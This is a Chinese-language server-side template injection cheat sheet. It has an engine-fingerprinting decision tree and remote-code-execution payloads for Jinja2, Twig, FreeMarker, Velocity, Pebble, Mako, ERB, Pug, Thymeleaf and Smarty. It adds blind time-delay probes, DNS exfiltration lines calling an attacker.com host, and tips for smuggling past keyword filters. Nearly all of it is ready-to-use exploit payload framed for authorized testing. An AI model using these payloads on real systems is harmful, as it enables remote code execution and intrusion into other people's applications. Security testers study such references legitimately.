# SSTI 引擎指纹与 Payload 矩阵

> 服务端模板注入的引擎识别决策树 + 各引擎 RCE payload。先指纹后利用；payload 均为授权测试验证手法。

## 1. 引擎指纹决策树

```
Send: {{7*7}}
├── 49 → Jinja2 or Twig?
│   └── Send: {{7*'7'}}
│       ├── 7777777 → Jinja2 (Python 字符串乘法)
│       └── 49      → Twig (PHP 数字强转)
├── {{7*7}} 原样 → 不是 Jinja2/Twig，继续试
│   └── Send: ${7*7}
│       ├── 49 → FreeMarker / Velocity / EL?
│       │   └── ${class.getClass()} 可用 → Velocity
│       │       <#assign x=1>${x} 出 1 → FreeMarker
│       │       都错 → Java EL / Thymeleaf
│       └── ${7*7} 原样 → 试 #{7*7} / <%= 7*7 %> / {7*7}
│           ├── #{7*7} → 49 → Pug/Jade 或 Ruby 插值
│           ├── <%= 7*7 %> → 49 → ERB (Ruby) / EJS (Node)
│           └── {7*7} → 49 → Smarty (PHP)
└── Error/500 → 报错栈可能直接泄露引擎名
```

探针顺序：`{{7*7}}` → `${7*7}` → `#{7*7}` → `<%= 7*7 %>` → `{7*7}` → `[% 7*7 %]`（ERB 注释风格偶见）。

## 2. Jinja2 (Python) —— 首选

### 信息泄露
```
{{config}}
{{config.items()}}
{{request.environ}}
{{request.application.__globals__}}
{{self.__dict__}}
{{[].__class__.__base__.__subclasses__()}}
```

### RCE 链
```
# config globals 直通（有 Flask 依赖）
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# lipsum 内置（Flask 都有）
{{lipsum.__globals__['os'].popen('id').read()}}

# MRO 子类遍历（通用，不依赖 Flask）
{{''.__class__.__mro__[1].__subclasses__()}}
# → 找到 subprocess.Popen 类下标 INDEX（常见 396-410 附近，按环境变）
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()}}

# 关键字被过滤时经 request.args/cookies 走私
{{request.args.__class__.__mro__[1].__subclasses__()[INDEX]...}}  # 配合 ?x=os
```

## 3. Twig (PHP)

```
{{7*7}} / {{7*'7'}} → 49（数字强转判定）
{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}
{{['id']|filter('system')}}
{{['id']|map('system')}}
{{['id']|join('|')}}  # 信息泄露面
```
- 要有 `_self` 可用（Twig 1.x 常见）；`registerUndefinedFilterCallback` 经典链

## 4. FreeMarker (Java)

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# 无 Execute 类时走对象遍历
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","id").start()}
```

## 5. Velocity (Java)

```
#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('id'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```
简化版（较新模板引擎可能过严）：
```
#set($x=''.class.forName('java.lang.Runtime').getRuntime().exec('id'))
```

## 6. Pebble (Java)

```
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('id') }}
```
Pebble 通过反射类访问；`getClass().forName` 链。

## 7. Mako (Python)

```
${__import__('os').popen('id').read()}
```

## 8. Slim / ERB / Jade-Pug (Ruby/Node)

```
# Slim (Ruby)
#{`id`}

# ERB (Ruby)
<%= system('id') %> / <%= `id` %>

# Pug/Jade (Node) — 大多为客户端，除非服务端渲染
#{ process.mainModule.require('child_process').execSync('id').toString() }
```

## 9. Thymeleaf (Java/Spring)

```
# Thymeleaf 非表达式前缀需配对闭合标签名（经典姿势）
<a th:href="@{__${T(java.lang.Runtime).getRuntime().exec('id')}__}">x</a>
```
- Thymeleaf 默认不解析任意表达式，`__${...}__` 预处理表达式是主要注入面

## 10. Smarty (PHP)

```
{system('id')}
{if system('id')}{/if}
```
- Smarty 3 默认禁用 `{php}`；`system` 走 `{system(...)}` 或 `{literal}` 绕过

## 11. 盲 SSTI 检测（无回显）

### 时间盲测（基线 vs payload 差 5s+）
```
# Jinja2
{{range(10000000)|list}}
{{''.__class__.__mro__[1].__subclasses__()[INDEX]('sleep 5',shell=True)}}

# Twig
{{['sleep 5']|map('system')}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("sleep 5")}

# Velocity
#set($x=''.class.forName('java.lang.Runtime').getRuntime().exec('sleep 5'))

# ERB / Smarty
<%= sleep(5) %> / {system('sleep 5')}
```

### DNS 外带（OOB）
```
# Jinja2
{{lipsum.__globals__.os.popen('nslookup TOKEN.attacker.com').read()}}

# Twig
{{['nslookup TOKEN.attacker.com']|map('system')}}

# FreeMarker
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("nslookup TOKEN.attacker.com")}
```

## 12. 纪律
- 先指纹后利用：决策树三发探针即可定引擎，别盲喷 payload
- RCE 验证走无害命令（`id`/`whoami`）+ DNSLOG 出网，授权 PoC 用完即清（见 `webshell.md`）
- 关键字过滤时优先走私（request 参数/cookie）而非硬撞
- 利用链中途失败换下一引擎 payload，不重复喷同一链